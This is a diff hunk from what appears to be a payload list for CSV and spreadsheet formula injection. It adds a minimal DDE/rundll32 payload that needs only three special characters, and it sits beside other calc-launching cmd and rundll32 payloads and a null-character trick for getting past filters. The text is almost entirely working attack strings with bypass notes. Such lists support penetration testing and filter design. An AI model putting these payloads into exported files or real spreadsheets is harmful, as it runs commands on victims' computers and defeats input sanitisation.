@@ -31,6 +31,9 @@ DDE ("cmd";"/C calc";"!A0")A0
 =rundll32|'URL.dll,OpenURL calc.exe'!A
 =rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
 
+# Using a minimal number of special characters. This example only needs ! = and ' not being filtered.
+=rundll32|'URL OpenURL calc'!A
+
 # Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed.
 =    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
 
